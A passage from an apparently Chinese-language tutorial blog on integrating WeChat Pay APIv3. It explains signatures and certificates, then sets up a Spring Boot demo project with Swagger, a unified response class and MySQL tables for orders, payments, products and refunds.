data-lazy-src="https://unpkg.com/nan-picture/blog/20220109184304.png"></p><p><strong>注意：这样还是无法鉴别出信息传输的完整性，黑客可以更改明文和摘要达到欺骗的目的，所以还需要数字签名</strong></p><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是使用私钥对摘要加密生成签名，需要由公钥将签名解密后进行验证，实现身份认证和不可否认。</p><p><strong>签名和验证签名的流程</strong>：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109184749.png"></p><h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109185214.png"></p><p>数字证书解决“公钥的信任”问题，可以防止黑客伪造公钥。</p><p>不能直接分发公钥，公钥的分发必须使用数字证书，数字证书由CA颁发：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109185440.png"></p><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109185555.png"></p><p><strong>通过数字证书获取公钥进行验签流程：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109185753.png"></p><p><strong>https协议中的数字证书：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109185918.png"></p><hr><h2 id="微信APIv3证书"><a href="#微信APIv3证书" class="headerlink" title="微信APIv3证书"></a>微信APIv3证书</h2><p><strong>商户证书</strong>：</p><p>商户API证书是指由商户申请的，包含商户的商户号、公司名称、公钥信息的证书。</p><p>商户证书在商户后台申请：<a href="https://pay.weixin.qq.com/index.php/core/cert/api_cert#/">https://pay.weixin.qq.com/index.php/core/cert/api_cert#/</a></p><p><strong>平台证书（微信支付平台）：</strong></p><p>微信支付平台证书是指由微信支付负责申请的，包含微信支付平台标识、公钥信息的证书。商户可以使用平台证书中的公钥进行验签。</p><p>平台证书的获取：<a href="https://pay.weixin.qq.com/wiki/doc/apiv3/wechatpay/wechatpay3_0.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/wechatpay/wechatpay3_0.shtml</a></p><blockquote><p>注意：API密钥和APIv3密钥都是对称加密需要使用的加密和解密密钥，一定要保管好，不能泄露。</p><ul><li><p>API密钥对应V2版本的API</p></li><li><p>APIv3密钥对应V3版本的API</p></li></ul></blockquote><hr><h1 id="创建案例项目"><a href="#创建案例项目" class="headerlink" title="创建案例项目"></a>创建案例项目</h1><h2 id="初始化SpringBoot项目"><a href="#初始化SpringBoot项目" class="headerlink" title="初始化SpringBoot项目"></a>初始化SpringBoot项目</h2><p>IDEA-&gt;NEW Project-&gt;Spring Initializer</p><p>注意：Java版本选择8，Server URL可以用阿里云的: <code>http://start.aliyun.com</code>，SringBoot版本是2.3.7</p><p>添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置yaml：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端口</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8090</span></span><br><span class="line"><span class="comment"># 应用名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Wechat-Payment</span></span><br></pre></td></tr></table></figure><p>创建Controller:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/product&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试访问：<a href="http://localhost:8090/api/product/test">http://localhost:8090/api/product/test</a></p><h2 id="引入Swagger"><a href="#引入Swagger" class="headerlink" title="引入Swagger"></a>引入Swagger</h2><p>作用：自动生成接口文档和测试页面。</p><p>添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建Swagger2的配置类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.spi.DocumentationType;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.spring.web.plugins.Docket;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.swagger2.annotations.EnableSwagger2;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Swagger2Config</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Docket</span> <span class="variable">docket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2);</span><br><span class="line">        docket.apiInfo(<span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>().title(<span class="string">&quot;微信支付案例接口文档&quot;</span>).build());</span><br><span class="line">        <span class="keyword">return</span> docket;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Swagger常用注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Api(tags = &quot;商品管理&quot;)</span><span class="comment">//用在类上</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/product&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;测试接口&quot;)</span> <span class="comment">//用在方法上</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试访问：<a href="http://localhost:8090/swagger-ui.html">http://localhost:8090/swagger-ui.html</a></p><p>注意：spring-boot-starter-web版本号如果太高会跟swagger匹配不上，可以配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="string">name:payment</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">pathmatch:</span></span><br><span class="line">      <span class="attr">matching-strategy:</span> <span class="string">ant_path_matcher</span></span><br></pre></td></tr></table></figure><h2 id="定义统一结果"><a href="#定义统一结果" class="headerlink" title="定义统一结果"></a>定义统一结果</h2><p>作用：定义统一响应结果，为前端返回标准格式的数据。</p><p>引入lombok依赖，简化实体类的开发：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">&lt;!--实体对象工具类：低版本idea需要安装lombok插件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建统一结果类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.vo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Accessors(chain = true)</span><span class="comment">//链式操作，set方法的返回值从void变成R</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">R</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> R <span class="title function_">ok</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">R</span>();</span><br><span class="line">        r.setCode(<span class="number">0</span>);</span><br><span class="line">        r.setMessage(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> R <span class="title function_">error</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">R</span>();</span><br><span class="line">        r.setCode(-<span class="number">1</span>);</span><br><span class="line">        r.setMessage(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">data</span><span class="params">(String key, Object value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改test方法，返回统一结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;测试接口&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">R</span>().data(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Hello World&quot;</span>).data(<span class="string">&quot;dataTime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置json时间格式：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端口</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8090</span></span><br><span class="line"><span class="comment"># 应用名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Wechat-Payment</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">date-format:</span> <span class="string">yyyy-MM-dd</span> <span class="string">HH:mm:ss</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">GMT+8</span></span><br></pre></td></tr></table></figure><p>Swagger测试接口：<a href="http://localhost:8090/swagger-ui.html">http://localhost:8090/swagger-ui.html</a></p><h2 id="新建数据库和表"><a href="#新建数据库和表" class="headerlink" title="新建数据库和表"></a>新建数据库和表</h2><p>在Mysql的查询窗口中执行以下命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE wechat_payment;</span><br><span class="line"></span><br><span class="line">USE `wechat_payment`;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Table structure for table `t_order_info` */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_order_info` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">11</span>) unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;订单id&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;订单标题&#x27;</span>,</span><br><span class="line">  `order_no` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商户订单编号&#x27;</span>,</span><br><span class="line">  `user_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">  `product_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;支付产品id&#x27;</span>,</span><br><span class="line">  `total_fee` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;订单金额(分)&#x27;</span>,</span><br><span class="line">  `code_url` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;订单二维码连接&#x27;</span>,</span><br><span class="line">  `order_status` <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;订单状态&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">1</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Table structure for table `t_payment_info` */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_payment_info` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;支付记录id&#x27;</span>,</span><br><span class="line">  `order_no` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商户订单编号&#x27;</span>,</span><br><span class="line">  `transaction_id` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;支付系统交易编号&#x27;</span>,</span><br><span class="line">  `payment_type` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;支付类型&#x27;</span>,</span><br><span class="line">  `trade_type` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;交易类型&#x27;</span>,</span><br><span class="line">  `trade_state` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;交易状态&#x27;</span>,</span><br><span class="line">  `payer_total` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;支付金额(分)&#x27;</span>,</span><br><span class="line">  `content` text COMMENT <span class="string">&#x27;通知参数&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">1</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Table structure for table `t_product` */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_product` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;商品id&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商品名称&#x27;</span>,</span><br><span class="line">  `price` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;价格（分）&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">1</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Data for the table `t_product` */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span>  <span class="keyword">into</span> `t_product`(`title`,`price`) <span class="keyword">values</span> (<span class="string">&#x27;Java课程&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">insert</span>  <span class="keyword">into</span> `t_product`(`title`,`price`) <span class="keyword">values</span> (<span class="string">&#x27;大数据课程&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">insert</span>  <span class="keyword">into</span> `t_product`(`title`,`price`) <span class="keyword">values</span> (<span class="string">&#x27;前端课程&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">insert</span>  <span class="keyword">into</span> `t_product`(`title`,`price`) <span class="keyword">values</span> (<span class="string">&#x27;UI课程&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Table structure for table `t_refund_info` */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_refund_info` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;退款单id&#x27;</span>,</span><br><span class="line">  `order_no` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商户订单编号&#x27;</span>,</span><br><span class="line">  `refund_no` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商户退款单编号&#x27;</span>,</span><br><span class="line">  `refund_id` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;支付系统退款单号&#x27;</span>,</span><br><span class="line">  `total_fee` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;原订单金额(分)&#x27;</span>,</span><br><span class="line">  `refund` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;退款金额(分)&#x27;</span>,</span><br><span class="line">  `reason` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;退款原因&#x27;</span>,</span><br><span class="line">  `refund_status` <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;退款状态&#x27;</span>,</span><br><span class="line">  `content_return` text COMMENT <span class="string">&#x27;申请退款返回参数&#x27;</span>,</span><br><span class="line">  `content_notify` text COMMENT <span class="string">&#x27;退款结果通知参数&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span 